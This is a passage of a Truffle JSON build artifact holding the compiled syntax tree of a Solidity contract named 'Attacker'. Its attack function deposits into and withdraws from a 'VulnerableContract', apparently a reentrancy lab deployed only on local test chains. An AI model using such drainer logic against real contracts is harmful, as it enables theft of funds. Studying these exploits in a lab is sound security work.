                          "typeIdentifier": "t_stringliteral_f2fcfb1855a589b32b2878b73a2520b2bf7921f661dcf388dcc7453e4cee601f",
                          "typeString": "literal_string \"Target amount must be greater than 0\""
                        },
                        "value": "Target amount must be greater than 0"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_f2fcfb1855a589b32b2878b73a2520b2bf7921f661dcf388dcc7453e4cee601f",
                          "typeString": "literal_string \"Target amount must be greater than 0\""
                        }
                      ],
                      "id": 95,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        4294967278,
                        4294967278
                      ],
                      "referencedDeclaration": 4294967278,
                      "src": "1608:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 100,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1608:66:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 101,
                  "nodeType": "ExpressionStatement",
                  "src": "1608:66:0"
                },
                {
                  "expression": {
                    "id": 104,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 102,
                      "name": "targetAmount",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 9,
                      "src": "1685:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 103,
                      "name": "_targetAmount",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 84,
                      "src": "1700:13:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "1685:28:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 105,
                  "nodeType": "ExpressionStatement",
                  "src": "1685:28:0"
                },
                {
                  "expression": {
                    "id": 109,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 106,
                      "name": "drainedAmount",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 11,
                      "src": "1724:13:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "expression": {
                        "id": 107,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 4294967281,
                        "src": "1740:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 108,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "value",
                      "nodeType": "MemberAccess",
                      "src": "1740:9:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "1724:25:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 110,
                  "nodeType": "ExpressionStatement",
                  "src": "1724:25:0"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "argumentTypes": [],
                        "expression": {
                          "id": 111,
                          "name": "vulnerable",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 5,
                          "src": "1830:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_VulnerableContract_$267",
                            "typeString": "contract VulnerableContract"
                          }
                        },
                        "id": 113,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "deposit",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 209,
                        "src": "1830:18:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_payable$__$returns$__$",
                          "typeString": "function () payable external"
                        }
                      },
                      "id": 116,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "names": [
                        "value"
                      ],
                      "nodeType": "FunctionCallOptions",
                      "options": [
                        {
                          "expression": {
                            "id": 114,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "1856:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 115,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "src": "1856:9:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "src": "1830:36:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
                        "typeString": "function () payable external"
                      }
                    },
                    "id": 117,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1830:38:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 118,
                  "nodeType": "ExpressionStatement",
                  "src": "1830:38:0"
                },
                {
                  "expression": {
                    "id": 125,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 119,
                      "name": "prevBalanceVulnerableContract",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 13,
                      "src": "1881:29:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "expression": {
                        "arguments": [
                          {
                            "id": 122,
                            "name": "vulnerable",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 5,
                            "src": "1921:10:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_VulnerableContract_$267",
                              "typeString": "contract VulnerableContract"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_VulnerableContract_$267",
                              "typeString": "contract VulnerableContract"
                            }
                          ],
                          "id": 121,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1913:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 120,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1913:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 123,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1913:19:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "id": 124,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "balance",
                      "nodeType": "MemberAccess",
                      "src": "1913:27:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "1881:59:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 126,
                  "nodeType": "ExpressionStatement",
                  "src": "1881:59:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "expression": {
                          "id": 130,
                          "name": "msg",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 4294967281,
                          "src": "2034:3:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_message",
                            "typeString": "msg"
                          }
                        },
                        "id": 131,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "value",
                        "nodeType": "MemberAccess",
                        "src": "2034:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 127,
                        "name": "vulnerable",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 5,
                        "src": "2014:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_VulnerableContract_$267",
                          "typeString": "contract VulnerableContract"
                        }
                      },
                      "id": 129,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "withdraw",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 262,
                      "src": "2014:19:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256) external"
                      }
                    },
                    "id": 132,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2014:30:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 133,
                  "nodeType": "ExpressionStatement",
                  "src": "2014:30:0"
                }
              ]
            },
            "functionSelector": "64dd891a",
            "id": 135,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "attack",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 85,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 84,
                  "mutability": "mutable",
                  "name": "_targetAmount",
                  "nodeType": "VariableDeclaration",
                  "scope": 135,
                  "src": "1487:21:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 83,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "1487:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "1486:23:0"
            },
            "returnParameters": {
              "id": 86,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1527:0:0"
            },
            "scope": 164,
            "src": "1471:626:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 158,
              "nodeType": "Block",
              "src": "2169:131:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 142,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 139,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "2188:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 140,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "src": "2188:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "id": 141,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 7,
                          "src": "2202:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "2188:19:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "4f6e6c79206f776e65722063616e207769746864726177",
                        "id": 143,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2209:25:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac",
                          "typeString": "literal_string \"Only owner can withdraw\""
                        },
                        "value": "Only owner can withdraw"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac",
                          "typeString": "literal_string \"Only owner can withdraw\""
                        }
                      ],
                      "id": 138,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        4294967278,
                        4294967278
                      ],
                      "referencedDeclaration": 4294967278,
                      "src": "2180:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 144,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2180:55:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 145,
                  "nodeType": "ExpressionStatement",
                  "src": "2180:55:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "id": 153,
                              "name": "this",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 4294967268,
                              "src": "2278:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_Attacker_$164",
                                "typeString": "contract Attacker"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_Attacker_$164",
                                "typeString": "contract Attacker"
                              }
                            ],
                            "id": 152,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "2270:7:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 151,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "2270:7:0",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 154,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2270:13:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "id": 155,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "balance",
                        "nodeType": "MemberAccess",
                        "src": "2270:21:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "arguments": [
                          {
                            "id": 148,
                            "name": "owner",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 7,
                            "src": "2254:5:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 147,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "2246:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 146,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "2246:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 149,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2246:14:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      },
                      "id": 150,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "src": "2246:23:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256)"
                      }
                    },
                    "id": 156,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2246:46:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 157,
                  "nodeType": "ExpressionStatement",
                  "src": "2246:46:0"
                }
              ]
            },
            "functionSelector": "24600fc3",
            "id": 159,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "withdrawFunds",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 136,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2157:2:0"
            },
            "returnParameters": {
              "id": 137,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2169:0:0"
            },
            "scope": 164,
            "src": "2135:165:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 162,
              "nodeType": "Block",
              "src": "2401:54:0",
              "statements": []
            },
            "functionSelector": "d0e30db0",
            "id": 163,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "deposit",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 160,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2381:2:0"
            },
            "returnParameters": {
              "id": 161,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2401:0:0"
            },
            "scope": 164,
            "src": "2365:90:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 165,
        "src": "98:2365:0"
      }
    ],
    "src": "33:2432:0"
  },
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "networks": {
    "5777": {
      "events": {},
      "links": {},
      "address": "0x36447BfFAa3E260DB50CAc4Da53cEBf03f3F4ec3",
      "transactionHash": "0x688e8ed93d2d95740d74a42f0fc81ec4f02c14bb9e26c084efe07bb472eb16cd"
    },
    "1726835334158": {
      "events": {},
      "links": {},
      "address": "0xC05Af5590446b06C9742EA24093E93ED46aBC6A7",
      "transactionHash": "0x10e13c461f82760693fcee064299aab63a6b56804191f5ca7f936b04a827ad95"
    },
    "1726855429099": {
      "events": {},
      "links": {},
      "address": "0x940B4Cf44067C81d38C29766F173A794Ca5a207A",
      "transactionHash": "0xd455c5c0c4871b09ad75d21546e9e5a353257cfc910be7c8def990b54246a877"
    }
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-09-22T17:06:54.127Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}